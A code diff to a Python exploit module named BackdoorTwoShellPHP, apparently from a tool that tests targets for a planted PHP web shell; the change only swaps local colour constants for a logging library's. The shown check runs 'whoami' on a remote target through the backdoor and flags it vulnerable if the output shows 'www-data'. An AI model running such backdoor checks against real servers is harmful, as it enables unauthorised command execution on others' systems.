@@ -1,13 +1,8 @@
 import urllib
 import requests
 from Exploit import Exploit, PatchedException
+import BetterLogger
 from BetterLogger import logger
-
-COLOR_OKGREEN = '\033[92m'
-COLOR_OKBLUE = '\033[94m'
-COLOR_ORANGE = '\033[93m'
-COLOR_FAIL = '\033[91m'
-COLOR_END = '\033[0m'
 
 class BackdoorTwoShellPHP(Exploit):
 	"""
@@ -38,15 +33,15 @@ class BackdoorTwoShellPHP(Exploit):
 			command = "whoami"
 			server_output = self.run_custom_command(command=command)
 			if "www-data" in server_output:
-				logger.info(f"{COLOR_OKGREEN}{self.ip_address} - The target is vulnerable to BackdoorTwoShellPHP!{COLOR_END}")
+				logger.info(f"{BetterLogger.COLOR_GREEN}{self.ip_address} - The target is vulnerable to BackdoorTwoShellPHP!{BetterLogger.COLOR_END}")
 				return True
 			raise PatchedException()
 		except PatchedException:
-			logger.info(f"{COLOR_FAIL}{self.ip_address} - The target is not vulnerable to BackdoorTwoShellPHP.{COLOR_END}")
+			logger.info(f"{BetterLogger.COLOR_RED}{self.ip_address} - The target is not vulnerable to BackdoorTwoShellPHP.{BetterLogger.COLOR_END}")
 			return False
 		except requests.ConnectTimeout:
-			logger.info(f"{COLOR_ORANGE}{self.ip_address} - The request timed out while checking if BackdoorTwoShellPHP is vulnerable.{COLOR_END}")
+			logger.info(f"{BetterLogger.COLOR_ORANGE}{self.ip_address} - The request timed out while checking if BackdoorTwoShellPHP is vulnerable.{BetterLogger.COLOR_END}")
 			return False
 		except Exception:
-			logger.info(f"{COLOR_ORANGE}{self.ip_address} - Something went wrong while checking if BackdoorTwoShellPHP is vulnerable.{COLOR_END}")
+			logger.info(f"{BetterLogger.COLOR_ORANGE}{self.ip_address} - Something went wrong while checking if BackdoorTwoShellPHP is vulnerable.{BetterLogger.COLOR_END}")
 			return False
